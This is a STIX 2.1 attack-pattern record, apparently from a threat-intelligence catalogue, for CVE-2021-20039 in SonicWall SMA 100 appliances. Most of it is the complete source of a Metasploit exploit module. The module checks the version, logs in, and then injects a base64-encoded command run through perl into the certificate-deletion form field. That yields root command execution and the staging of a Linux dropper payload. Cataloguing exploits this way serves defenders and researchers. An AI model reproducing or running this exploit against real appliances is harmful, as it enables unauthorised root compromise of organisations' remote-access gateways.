{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20cd24a6-1ac9-4033-9f9c-441f6e4f1213",
    "created": "2024-08-14T17:03:57.494303Z",
    "modified": "2024-08-14T17:03:57.494307Z",
    "name": "SonicWall SMA 100 Series Authenticated Command Injection",
    "description": " This module exploits an authenticated command injection vulnerability in the SonicWall SMA 100 series web interface. Exploitation results in command execution as root. The affected versions are:  - 10.2.1.2-24sv and below - 10.2.0.8-37sv and below - 9.0.0.11-31sv and below  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/sonicwall_cve_2021_20039.rb",
            "external_id": "sonicwall_cve_2021_20039.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-20039"
        },
        {
            "source_name": "reference",
            "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/01/11/cve-2021-20038-42-sonicwall-sma-100-multiple-vulnerabilities-fixed-2"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SonicWall SMA 100 Series Authenticated Command Injection',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability\n          in the SonicWall SMA 100 series web interface. Exploitation results in\n          command execution as root. The affected versions are:\n\n          - 10.2.1.2-24sv and below\n          - 10.2.0.8-37sv and below\n          - 9.0.0.11-31sv and below\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-20039' ],\n          [ 'URL', 'https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026'],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2022/01/11/cve-2021-20038-42-sonicwall-sma-100-multiple-vulnerabilities-fixed-2'],\n          [ 'URL', 'https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis']\n        ],\n        'DisclosureDate' => '2021-12-14',\n        'Platform' => ['linux'],\n        'Arch' => [ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'echo', 'printf' ]\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'PrependFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password']),\n      OptString.new('SWDOMAIN', [true, 'The domain to log in to', 'LocalDomain']),\n      OptString.new('PORTALNAME', [true, 'The portal to log in to', 'VirtualOffice'])\n    ])\n  end\n\n  ##\n  # Extract the version number from a javascript include in the login landing page.\n  # And compare the version against known affected. Affected versions are:\n  #\n  # 10.2.1.2-24sv and below\n  # 10.2.0.8-37sv and below\n  # 9.0.0.11-31sv and below\n  ##\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/welcome'),\n      'agent' => 'SonicWALL Mobile Connect'\n    })\n    return CheckCode::Unknown('Failed to retrieve the version information') unless res&.code == 200\n\n    version = res.body.match(/\\.([0-9.\\-a-z]+)\\.js\" type=/)\n    return CheckCode::Unknown('Failed to retrieve the version information') unless version\n\n    version = version[1]\n\n    major, minor, revision, build = version.split('.', 4)\n    build, point = build.split('-', 2)\n    print_status(\"Version found: #{major}.#{minor}.#{revision}.#{build}-#{point}\")\n    point.delete_suffix('sv')\n\n    case major\n    when '9'\n      return CheckCode::Safe unless minor.to_i == 0 && revision.to_i == 0 && build.to_i <= 11 && point.to_i <= 31\n    when '10'\n      return CheckCode::Safe unless minor.to_i == 2\n\n      case revision\n      when '0'\n        return CheckCode::Safe unless build.to_i <= 8 && point.to_i <= 37\n      when '1'\n        return CheckCode::Safe unless build.to_i <= 2 && point.to_i <= 24\n      else\n        return CheckCode::Safe\n      end\n    else\n      return CheckCode::Safe\n    end\n    CheckCode::Appears('Based on the discovered version.')\n  end\n\n  def login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/userLogin'),\n      'agent' => 'SonicWALL Mobile Connect',\n      'vars_post' =>\n      {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'domain' => datastore['SWDOMAIN'],\n        'portalname' => datastore['PORTALNAME'],\n        'login' => 'true',\n        'verifyCert' => '0',\n        'ajax' => 'true'\n      },\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&.code == 200\n    fail_with(Failure::NoAccess, 'Login failed') unless res.get_cookies.include?('swap=')\n    print_good('Authentication successful')\n  end\n\n  ##\n  # Send the exploit in the \"CERT\" field when \"deleting\" a certificate. The\n  # backend requires the payload start with \"n\". Also, there is a very small\n  # amount of space to fit the command into (otherwise we'll trigger a bof).\n  # Finally! The command has a lot of disallowed characters: /$&|>;`^. Which\n  # is problematically for basically all the payloads. The system also is\n  # missing useful tools like wget, base64, and curl (10.2 has curl but\n  # whatever). As such, it seemed the easiest thing to do is wrap the entire\n  # command in base64 and then use perl to decode/execute it.\n  ##\n  def execute_command(cmd, _opts = {})\n    cmd_encoded = Rex::Text.encode_base64(cmd)\n    perl_eval = \"n\\nperl -MMIME::Base64 -e 'system(decode_base64(\\\"#{cmd_encoded}\\\"))'\"\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part('delete', nil, nil, 'form-data; name=\"buttontype\"')\n    multipart_form.add_part(perl_eval, nil, nil, 'form-data; name=\"CERT\"')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/viewcert'),\n      'agent' => 'SonicWALL Mobile Connect',\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    }, 5)\n\n    if res && res.code != 200\n      # the response should always be 200, unless meterpreter holds the\n      # connection open.\n      fail_with(Failure::UnexpectedReply, 'Only expected 200 OK')\n    end\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    login\n    execute_cmdstager(linemax: 40)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}